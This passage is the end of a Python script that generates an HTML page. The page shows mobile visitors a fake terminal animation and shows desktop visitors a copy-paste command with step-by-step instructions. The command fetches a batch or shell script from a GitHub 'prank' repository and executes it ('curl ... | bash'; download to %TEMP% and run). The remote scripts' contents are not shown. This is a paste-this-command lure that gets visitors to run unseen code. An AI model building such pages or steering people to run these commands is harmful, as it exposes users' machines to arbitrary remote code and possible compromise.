      setTimeout(typeChar, cur.pause || 400);
    }}
  }}

  setTimeout(typeChar, 400);
}}

/* ==========================================================================
   DESKTOP LAUNCHER CONTROLLER
   ========================================================================== */
function initDesktop() {{
  const desktopContainer = document.getElementById("desktop-container");
  const mobileTerminal = document.getElementById("mobile-terminal");
  if (mobileTerminal) mobileTerminal.style.display = "none";
  desktopContainer.style.display = "block";

  const WIN_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
  const UNIX_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.sh | bash';

  const tabWin = document.getElementById("tab-win");
  const tabUnix = document.getElementById("tab-unix");
  const cmdDisplay = document.getElementById("cmd-display");
  const cmdHint = document.getElementById("cmd-hint");
  const copyBtn = document.getElementById("btn-copy");

  let currentCmd = WIN_CMD;

  function setTab(os) {{
    if (os === "unix") {{
      tabUnix.classList.add("active");
      tabWin.classList.remove("active");
      currentCmd = UNIX_CMD;
      cmdDisplay.textContent = UNIX_CMD;
      cmdHint.innerHTML = '&gt; <b>Step 1:</b> Open <b>Terminal</b> (Cmd + Space &rarr; Terminal on Mac, or Ctrl + Alt + T on Linux).<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
    }} else {{
      tabWin.classList.add("active");
      tabUnix.classList.remove("active");
      currentCmd = WIN_CMD;
      cmdDisplay.textContent = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
      cmdHint.innerHTML = '&gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
    }}
  }}

  tabWin.addEventListener("click", () => {{
    setTab("win");
  }});

  tabUnix.addEventListener("click", () => {{
    setTab("unix");
  }});

  // Auto-detect Mac / Linux
  const plat = navigator.platform || '';
  const ua = navigator.userAgent || '';
  if (/Macintosh|MacIntel|Linux/i.test(plat) || /Mac OS|Linux/i.test(ua)) {{
    setTab("unix");
  }} else {{
    setTab("win");
  }}

  copyBtn.addEventListener("click", () => {{
    const textToCopy = currentCmd;
    if (navigator.clipboard && navigator.clipboard.writeText) {{
      navigator.clipboard.writeText(textToCopy).then(() => {{
        copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
        copyBtn.style.background = "#00e650";
        copyBtn.style.color = "#040608";
        setTimeout(() => {{
          copyBtn.textContent = "> CLICK TO COPY COMMAND";
          copyBtn.style.background = "#0f1c14";
          copyBtn.style.color = "#00e650";
        }}, 2500);
      }});
    }} else {{
      const ta = document.createElement("textarea");
      ta.value = textToCopy;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
      copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
      copyBtn.style.background = "#00e650";
      copyBtn.style.color = "#040608";
      setTimeout(() => {{
        copyBtn.textContent = "> CLICK TO COPY COMMAND";
        copyBtn.style.background = "#0f1c14";
        copyBtn.style.color = "#00e650";
      }}, 2500);
    }}
  }});
}}

/* ==========================================================================
   INITIALIZATION ROUTER
   ========================================================================== */
function runRouter() {{
  const device = detectDevice();
  console.log("Device detection result:", device);

  if (device === "iphone") {{
    runMobileTerminal(IPHONE_SCRIPT, "iphone");
  }} else if (device === "ipad") {{
    runMobileTerminal(IPAD_SCRIPT, "ipad");
  }} else if (device === "android-phone") {{
    runMobileTerminal(ANDROID_PHONE_SCRIPT, "android");
  }} else if (device === "android-tablet") {{
    runMobileTerminal(ANDROID_TABLET_SCRIPT, "android-tablet");
  }} else {{
    initDesktop();
  }}
}}

if (document.readyState === "loading") {{
  document.addEventListener("DOMContentLoaded", runRouter);
}} else {{
  runRouter();
}}
</script>
</body>
</html>
"""

    with open("index.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    size_kb = os.path.getsize("index.html") / 1024
    print(f"Successfully generated index.html ({size_kb:.1f} KB)")

if __name__ == "__main__":
    build()
